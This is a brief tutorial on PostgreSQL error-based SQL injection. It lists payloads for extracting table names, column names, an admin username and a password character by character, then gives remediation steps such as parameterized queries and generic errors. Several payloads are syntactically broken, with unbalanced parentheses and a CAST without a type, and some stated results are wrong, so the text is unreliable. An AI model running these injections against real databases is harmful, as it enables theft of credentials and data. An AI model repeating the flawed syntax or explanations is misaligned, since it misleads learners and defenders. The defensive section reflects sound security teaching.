Understanding PostgreSQL Error-Based SQL Injection

Vulnerability Type: Error-Based SQL Injection (Type Casting & Syntax Leakage)

How It Works: PostgreSQL error messages reveal database structure, column types, and query syntax. By triggering intentional errors, you can extract sensitive data.

The Vulnerable Query:

SELECT * FROM products WHERE id = '{input}'

Detection Method:

1. Submitting queries that cause type errors

2. Analyzing error messages for leaked information

3. Using type casting to extract data character by character

PostgreSQL Error-Based Techniques

1. Table Name Extraction

1' AND (SELECT tablename FROM pg_tables) LIMIT 1 OFFSET 0) > 0--
Result: Shows 'ERROR: operator does not exist: '

This reveals all table names as errors, showing which tables exist.

2. Column Name Extraction

1' AND CAST((SELECT column_name::text FROM information_schema.columns WHERE table_name='products' LIMIT 1 OFFSET 0) > 0--
Result: Shows "ERROR: type "text" is not unique" or shows column list

This reveals the column structure of the products table.

3. Data Extraction with CAST

1' AND CAST((SELECT username FROM secret_admin WHERE username='admin') AS int) > 0--
Result: If admin exists, returns admin username as integer

Shows the username (converted to integer for extraction).

4. Password Extraction Character-by-Character

1' AND (SELECT SUBSTR(password::text, 1, 1)='a')::text) > 0--
Result: If first character is 'a', returns first product

This tests each character position systematically.

How to Fix This Vulnerability

1. Use Parameterized Queries:

cursor.execute("SELECT * FROM products WHERE id = %s", (product_id,))

2. Disable Verbose Error Messages:

Log errors server-side, show generic messages to users.

3. Input Validation:

Validate that ID is numeric before using in query.

4. Use ORM Frameworks:

SQLAlchemy, Django ORM handle escaping automatically.
